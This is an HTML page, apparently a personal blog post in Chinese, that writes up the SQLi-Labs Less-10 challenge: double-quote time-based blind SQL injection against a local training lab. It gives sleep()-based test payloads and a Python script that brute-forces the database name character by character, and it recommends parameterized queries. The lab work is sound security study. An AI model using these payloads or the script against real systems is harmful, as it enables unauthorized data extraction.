@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: SQLi-Labs Less-10 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-database"></i> SQLi-Labs Less-10</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月25日</span>
+            <span><i class="fas fa-tag"></i> SQLi-Labs</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> SQL注入</span>
+            <span><i class="fas fa-tag"></i> 时间盲注（双引号）</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>SQLi-Labs Less-10 (GET - Blind - Time based - double quotes)</li>
+            <li><strong>题目平台：</strong>SQLi-Labs 本地靶场</li>
+            <li><strong>题目类型：</strong>Web安全 / SQL注入 / 时间盲注</li>
+            <li><strong>靶场链接：</strong>http://localhost:8081/Less-10/（本地环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器、Python（requests库、time库）</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>基于双引号闭合的时间盲注（Time-Based Blind SQL Injection）</strong>。它与 Less-9 的漏洞原理完全一致，唯一区别在于后端 SQL 语句使用双引号（<code>"</code>）包裹变量。攻击者必须利用 <code>sleep()</code> 函数制造延迟，通过响应时间差异逐字符猜解数据。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>尝试 <code>?id=1" and if(1=1, sleep(5), 0) --+</code>，页面明显延迟 5 秒加载。</li>
+            <li>尝试 <code>?id=1" and if(1=2, sleep(5), 0) --+</code>，页面瞬间加载。</li>
+            <li>确认双引号闭合成功，且存在时间盲注。</li>
+            <li>直接复用 Less-9 的 Python 脚本，只需修改请求 URL 和 Payload 里的闭合符号。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：Python 脚本中双引号的转义</h4>
+            <p><strong>踩坑情况：</strong>直接修改 URL 为 <code>"http://localhost:8081/Less-10/?id=1""</code>，导致 Python 语法报错。</p>
+            <p><strong>原因分析：</strong>URL 本身包含双引号，与 Python 字符串的引号冲突。</p>
+            <p><strong>改进方式：</strong>在 Python 中用反斜杠转义：<code>url = "http://localhost:8081/Less-10/?id=1\""</code>。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录二：代码变量未定义/文件未保存</h4>
+            <p><strong>踩坑情况：</strong>脚本报错 <code>NameError</code> 或终端提示找不到文件。</p>
+            <p><strong>原因分析：</strong>在猜解长度的函数中误用了字符猜解的变量，以及文件未按 <code>Cmd + S</code> 保存。</p>
+            <p><strong>改进方式：</strong>修正代码逻辑，确认保存后再运行。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（Python 脚本爆破）</h4>
+            
+            <p><strong>第一步：手动验证时间盲注</strong></p>
+            <pre><code>?id=1" and if(1=1, sleep(5), 0) --+   (页面延迟)
+?id=1" and if(1=2, sleep(5), 0) --+   (页面瞬间加载)</code></pre>
+            <p><strong>逐字解析：</strong><code>"</code> 闭合双引号。<code>if(条件, 真值, 假值)</code> 配合 <code>sleep()</code> 制造延迟信号。</p>
+
+            <p><strong>第二步：修改 Python 脚本</strong></p>
+            <p>将 Less-9 脚本修改为以下关键代码即可（注意文件命名为 <code>sqli_labs_10.py</code>）：</p>
+            <pre><code>import requests
+import time
+
+# 修改点 1：URL 路径变为 Less-10，双引号转义
+url = "http://localhost:8081/Less-10/?id=1\""
+
+def get_database_name(length):
+    name = ""
+    for i in range(1, length + 1):
+        for ascii_val in range(32, 127):
+            # 修改点 2：Payload 中的单引号换成双引号
+            payload = f" and if(ascii(substr(database(),{i},1))={ascii_val}, sleep(3), 0) --+"
+            start = time.time()
+            try:
+                requests.get(url + payload, timeout=10)
+            except:
+                pass
+            end = time.time()
+            if end - start > 1.5:
+                name += chr(ascii_val)
+                print(f"[+] 已猜解: {name}")
+                break
+    return name
+
+print("[*] 开始爆破...")
+db_name = get_database_name(8)
+print(f"[*] 数据库名称为: {db_name}")</code></pre>
+            <p><strong>预期结果</strong>：脚本输出 <code>security</code>，证明 Less-10 时间盲注成功。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>代码复用与重构：</strong>Less-9 和 Less-10 共用 99% 的代码，体现了“参数化”思维。在实际开发中，将变化的量（URL、闭合符）提取为变量，可以大幅提高效率。</li>
+            <li><strong>安全开发（SDL）：</strong>无论用单引号还是双引号，字符串拼接都是漏洞之源。必须使用参数化查询。</li>
+            <li><strong>自动化测试：</strong>利用时间差探测接口状态，是自动化测试和系统监控中的常用手段。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. 双引号闭合时间盲注</h4>
+            <p>Less-10 的专属闭合方式。与单引号（<code>'</code>）闭合原理相同，但在编写 Payload 和 Python 脚本时，必须注意字符转义（<code>\"</code>）。</p>
+
+            <h4>2. if(cond, true_val, false_val) 与 sleep()</h4>
+            <p>MySQL 的逻辑判断与延迟函数。利用 <code>sleep(3)</code> 让数据库暂停执行，是时间盲注制造“二进制信号”（延迟或不延迟）的唯一方式。</p>
+
+            <h4>3. Python 时间戳计算</h4>
+            <p>利用 <code>time.time()</code> 记录请求前后的时间，通过阈值（如 <code>end - start > 1.5</code>）来判断是否触发了延迟，这是脚本的核心逻辑。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 Less-9 的区别：</strong>Less-9 是单引号闭合，Less-10 是双引号闭合。两者原理完全一致。</li>
+            <li><strong>与 Less-8（布尔盲注）的区别：</strong>Less-8 看页面内容变化判断真假；Less-10 看时间长短判断真假。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因</h3>
+        <p>与 Less-9 相同，开发人员屏蔽了所有输出，却忽略了 SQL 执行时可能产生的延迟副作用。这警示我们，安全防御不能只停留在“不输出数据”的层面。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>时间盲注是 SQL 注入中的“核武器”，常用于极其隐蔽的场景。但在真实红蓝对抗中，由于耗时较长且易被流量分析发现，需谨慎使用。</p>
+
+        <h3>4. 如何抽象理解概念（大白话理解）</h3>
+        <div class="highlight-box">
+            <p><strong>把数据库比作一个“密室守卫”：</strong></p>
+            <ul>
+                <li><strong>Less-9（单引号锁）：</strong>守卫的门锁是单引号形状的，只有单引号钥匙才能和他沟通。</li>
+                <li><strong>Less-10（双引号锁）：</strong>守卫的门锁换成了双引号形状。如果你还用单引号去捅，守卫听不懂；换成双引号，他才会配合你玩“延迟”的游戏，你就能通过时间差得知他心里的秘密。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
